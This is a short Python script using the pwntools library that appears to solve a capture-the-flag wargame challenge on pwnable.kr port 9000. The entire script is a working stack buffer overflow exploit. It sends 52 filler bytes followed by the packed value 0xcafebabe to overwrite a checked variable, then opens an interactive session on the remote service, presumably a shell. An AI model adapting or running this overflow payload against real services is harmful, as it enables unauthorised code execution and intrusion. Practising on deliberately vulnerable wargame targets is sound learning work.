from pwn import *

r = remote('pwnable.kr',9000)
r.send('A'*52+p32(0xcafebabe))
r.interactive()
